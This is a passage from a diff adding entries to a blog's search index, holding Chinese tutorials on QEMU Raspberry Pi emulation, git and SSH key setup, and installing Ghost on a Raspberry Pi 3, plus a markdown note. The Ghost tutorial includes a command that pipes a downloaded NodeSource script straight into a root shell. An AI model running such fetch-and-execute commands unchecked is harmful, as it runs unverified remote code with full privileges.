kernel-qemu-4.4.34-jessie -cpu arm1176 -m 256 -M versatilepb -no-reboot -serial stdio -append &quot;root=/dev/sda2 panic=1 rootfstype=ext4 rw&quot; -redir tcp:5022::22 -hda /dev/sdb 参数解释-kernel 内核文件-cpu arm运行cpu可以qemu-arm -cpu help-m 是内存大小-M 支持的机器使用命令qemu-system-arm -M help查看 wiki-append 告诉内核参数-hda 指定硬盘，也可以img文件]]></content>
+      <categories>
+        <category>树莓派</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>rpi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[git 常用配置]]></title>
+    <url>%2Farticle%2F4003623714.html</url>
+    <content type="text"><![CDATA[arch Linux中Git命令自动补全刚从基于Debian系统转到基于arch Linux系统，结果用Git命令的时候发现Git命令自动没办法使用。查看wiki文件两种解决办法 环境变量法 12345vim ~/bashrc#添加一句[ -f /usr/share/git/completion/git-completion.bash ] &amp;&amp; source /usr/share/git/completion/git-completion.bash#刷新环境变量source ~/bashrc 安装bash-completlon 1yaourt -S bash-completion 参考：archlinux wiki 顺便提一句防止自己忘记，git配置分级别： 系统级别–system 写入/etc/gitconfig 全局级别–global 写入~/.gitconfig或~/.config/git/config 项目级别–local 写入仓库.git/config (平时写的时候直接省略直接写git config) 配置分级优先级:项目级别–&gt;全局级别–&gt;系统级别 初始Git配置123456789#设置全局用户信息git config --global user.name windgit config --global user.email @gmail.com#也可以单独给项目设置用户去掉--global全局参数，参照git config user.name#编辑工具git config --global core.editor=vimgit config --global merge.tool=vimdiff Git认证，经常使用github经常输入密码太麻烦Git认证有两种模式一种HTTPS和SSH https认证设置1git config --global credential.helper cache #设置认证储存方式cache(15分钟缓存)，store(明文储存) SSH认证 生成ssh公私密匙1ssh-keygen -t rsa -b 4096 -c “@gmail.com” 当前目录下会有刚刚要求你输入的id_rsa(私)和id_rsa.pub(公) 上传公匙公匙上传到github 【Settings】–&gt;【SSH and GPG keys】–&gt;【New SSH Key】 PC储存私匙到系统 1ssh-add id_rsa 验证公私密匙 123ssh -T git@github.com#看到下面这一句说明验证成功#Hi leolee! You've successfully authenticated, but GitHub does not provide shell access. 多用户认证修改~/.ssh/config 1234Host wind #Host 别名自定义 HostName github.com #HostName 服务地址 User mofeng64@gmail.com #User 用户名 IdentityFile ~/work/db/github #密匙地址 参考: 深入浅出Git权限校验 云服务器之密钥认证和git hook配置]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[树莓派3安装Ghost博客]]></title>
+    <url>%2Farticle%2F4121126904.html</url>
+    <content type="text"><![CDATA[现在Ghost博客升级很快，1.0版本以上用Ghost-cli方法安装，本教程是树莓派安装1.5.2版本 1. 安装前准备1.1 系统版本检查最新版本Ghost需要在Ubuntu 16 上安装，如果你使用的是Raspbian系统请替换为Ubutun系统。树莓派Ubutun系统请参考该文章安装 1.3 软件依赖1234sudo apt-get update &amp;&amp; sudo apt-get upgrade -ysudo apt-get install nginxsudo apt-get install mariadb-serversudo ufw allow 'Nginx Full' mariadb 其实就是mysql只是我mysql被收购不开源了，mariadb是mysql创造者把mysql卖给oracle后的继续开源mysql安装mariadb时要求输入root密码ufw allow ‘Nginx Full’ 是允许HTTP和HTTPS访问 1.4 安装Node.js安装最新Nodejs，我安装时候Nodejs版本为(v6.11.1)12curl -sL https://deb.nodesource.com/setup_6.x | sudo -E bashsudo apt-get install -y nodejs 1.5 安装Ghost-Cli工具安装Ghost命令客户端1sudo npm i -g ghost-cli 1.6 用户准备添加用户（如果不准备添加忽略）123adduser &lt;username&gt;usermod -aG sudo &lt;username&gt;su - &lt;username&gt; username 请添加你要添加的用户名 准备博客项目存放位置123sudo mkdir -p /var/www/ghostsudo chown [user]:[user] /var/www/ghostcd /var/www/ghost 2. 安装Ghost1ghost install 等待下载最新版本Ghost，我安装的时候是1.5.2。安装过程中各种询问 您博客的网址 您的MySQL用户名（root默认情况下） 您的MySQL密码（无论您在安装MySQL服务器时设置为什么） Ghost数据库名称（ghost_production默认情况下） 无论你想要一个ghost用户 是否要配置Nginx 是否要设置SSL 安装系统，所以你可以轻松地启动和停止Ghost 是否要启动Ghost]]></content>
+      <categories>
+        <category>树莓派</category>
+      </categories>
+      <tags>
+        <tag>rpi</tag>
+        <tag>ghost</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[markdown学习比较]]></title>
+    <url>%2Farticle%2F2924683816.html</url>
+    <content type="text"><![CDATA[斜体和粗体代码:1234*斜体*或_斜体_**粗体*****加粗斜体***~~删除线~~ 显示效果： 斜体或斜体 粗体 加粗斜体 删除线]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[测速]]></title>
+    <url>%2Farticle%2F1855984339.html</url>
+    <content type="text"><![CDATA[]]></content>
+      <categories>
+        <category>test</category>
+      </categories>
+      <tags>
+        <tag>test</tag>
+      </tags>
+  </entry>
+</search>
